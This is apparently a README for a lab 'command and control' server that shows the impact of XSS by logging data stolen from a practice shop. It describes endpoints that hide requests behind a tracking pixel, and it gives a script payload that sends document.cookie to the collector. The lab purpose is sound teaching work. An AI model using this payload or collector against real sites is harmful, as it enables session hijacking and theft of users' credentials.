# 😈 Hacker Command & Control (C2) Server

This is a simple data collection server used to demonstrate the impact of **Cross-Site Scripting (XSS)** attacks.

## 📡 Functionality

This server provides endpoints to receive and log data stolen from victims (e.g., cookies, session tokens, keystrokes).

- **GET `/log?data=...`**: Receives data via query parameters. Returns a 1x1 transparent pixel to hide the request.
- **POST `/log`**: Receives data via the request body. Useful for larger payloads or exfiltrating data via `fetch()`.
- **Dashboard**: View collected logs at the root URL.

## 🚀 How to Run

1. `npm install`
2. `node server.js`
3. Server runs on [http://localhost:4000](http://localhost:4000)

## 🛠️ Usage in XSS

Example payload to inject into the vulnerable shop's review section:

```html
<script>
  new Image().src = 'http://localhost:4000/log?data=' + document.cookie;
</script>
```

---
*Educational use only.*
